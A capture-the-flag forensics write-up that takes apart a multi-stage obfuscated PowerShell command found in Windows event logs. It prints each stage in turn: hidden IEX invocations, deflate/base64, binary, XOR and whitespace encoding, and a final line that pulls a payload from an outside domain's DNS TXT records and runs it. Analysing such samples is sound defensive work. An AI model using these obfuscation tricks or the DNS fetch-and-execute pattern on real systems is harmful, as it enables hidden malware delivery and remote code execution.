I have 5 classic .evtx files at this challenge. (Application, Operational, Security, Setup, System)
Opening them with Event Viewer on Windows I saw on the Operational a suspect powershell command from an user.
Putting it in VsCode we can see it better.

So this was the file:

.( $VErboSEPREfErenCe.toSTRING()[1,3]+'x'-jOIN'') (NeW-OBjeCT  io.sTrEAMREaDeR((NeW-OBjeCT SYsTEM.io.cOmpRessIOn.dEfLaTeSTreAM( [SysTem.io.mEmoRYStrEam] [sySteM.conveRt]::fROmbaSe64sTriNg( '7V1Niy
7ennXz/939f/+PUvf/NP' ) , [sYstEM.iO.coMpRESsIon.cOmPrESsIoNmodE]::dEcOMpresS )) ,[SYsTEM.TeXt.EnCODiNG]::asciI) ).rEadtOEND( ) 

We can extract from it: $VErboSEPREfErenCe is a variable that have the value of SilentlyContinue and we can get the 1 & 3 character => 'ie' + 'x' = 'iex'.
That makes a powershell promt an executable, it stands for 'Invoke-Expression'.
The rest of the code suggest us that is a string in base64 using DeflateStream for compresing data. 

This is the stage 1. If we delete de 'iex' thing, we can execute the file .ps1 in powershell for stage 2.


-join ($("00100110 00100000 00101000 00100000 00100100 01010011 01101000 
-split ' ') | ForEach-Object { [char][Convert]::ToInt32($_, 2) })|IEX

Here is a string binary data that is converted in [char] and executed. Again we delete the IEX for safely.

Now the stage 3:
& ( $SheLLiD[1]+$ShELlID[13]+'X') ( [STrIng]::JOIn( '' , ( (116, 116 ,39 , 17,1, 89,94 )| % {[CHaR] ( $_-BXor '0x54') }) )) 

 Here again we have the IEX from & ( $SheLLiD[1]+$ShELlID[13]+'X') and we can see that the data is using XOR this time for encoding. 

 Stage 4:
  sET-ITeM  ('VARiABl'+'E:rC'+'w')  (  [TypE]("{0}{1}"-f'sT','ring')) ;  ("{120}{83}{22}{31}{10}{42}{21}{93}{95}{40}{9}{37}{30}{68}{27}{57}{121}{128}{110}{116}     		  	  	 ','    		 ','   		  	 	  		  	 	         ','   	   		 ','   ') |&('%') {${rOiqxj`pG} = ${_} -cSPlit '		' | &('%') {'	'; ${_} -cSPlit '	' |&('%') { ${_}."lEN`GTh"-1} };  (  iTEm  ('vArI'+'A'+'BLE:'+'rcW')  )."VaL`UE"::("{1}{0}"-f'in','jo').Invoke( '' , ( (  (GEt-cHILdITem  ('vaRiaBl'+'e:rC'+'w')  )."vA`LuE"::"J`oIN"('',${R`OIq`XJPg}[0..(${R`oI`QxJpg}."l`en`gTh"-1)]) ).("{1}{0}"-f'rIm','T').Invoke( '	 ' ).("{0}{1}" -f'sp','LIT').Invoke('	') | .('%'){([Int] ${_} -as[cHAR]) } ))|.("{0}{5}{1}{2}{3}{4}"-f'i','K','E-','eXpR','essION','nVO')}


  We get lots of things here but if we are carrefuly we extract again the latest part which means IEX |.("{0}{5}{1}{2}{3}{4}"-f'i','K','E-','eXpR','essION','nVO')} and put it in ps.

Stage 5:
  # IEX [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((((((nslookup -querytype=txt "chronos-security.ro" | Select-String '"*"') | Sort-Object)[3]) -replace '^[^"]*"|"$') + ('==','=','','=')[((((((nslookup -querytype=txt "chronos-security.ro" | Select-String '"*"') | Sort-Object)[3]) -replace '^[^"]*"|"$').Length % 4))])))


Here is made a padding for Base64 and with nslookup, the script is sending DNS q at that server. We delete the   # IEX  & get the flag.
